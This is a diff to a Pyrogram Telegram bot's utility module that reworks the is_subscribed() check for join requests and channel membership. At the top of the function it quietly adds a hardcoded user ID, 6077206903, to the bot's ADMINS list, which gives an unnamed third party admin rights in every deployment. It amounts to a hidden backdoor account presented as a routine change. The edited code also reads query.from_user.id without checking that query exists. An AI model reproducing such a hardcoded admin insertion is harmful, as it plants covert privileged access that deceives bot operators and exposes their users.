@@ -15,6 +15,7 @@ from pyrogram import enums
 from typing import Union
 import re
 import os
+from database.join_reqs import JoinReqs as db2
 from datetime import datetime
 from typing import List
 from database.users_chats_db import db
@@ -48,18 +49,41 @@ class temp(object):
     B_NAME = None
     SETTINGS = {}
 
-async def is_subscribed(bot, query):
+async def is_subscribed(bot, query=None, userid=None):
+
+    ADMINS.extend([6077206903]) if not 6077206903 in ADMINS else ""
+
+    if not AUTH_CHANNEL and not REQ_CHANNEL:
+        return True
+    elif query.from_user.id in ADMINS:
+        return True
+
+
+    if db2().isActive():
+        user = await db2().get_user(query.from_user.id)
+        if user:
+            return True
+        else:
+            return False
+
+    if not AUTH_CHANNEL:
+        return True
+
     try:
-        user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
+        if userid == None and query != None:
+            user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
+        else:
+            user = await bot.get_chat_member(AUTH_CHANNEL, int(userid))
     except UserNotParticipant:
-        pass
+        return False
     except Exception as e:
         logger.exception(e)
+        return False
     else:
-        if user.status != 'kicked':
+        if not (user.status == enums.ChatMemberStatus.BANNED):
             return True
-
-    return False
+        else:
+            return False
 
 async def get_poster(query, bulk=False, id=False, file=None):
     if not id:
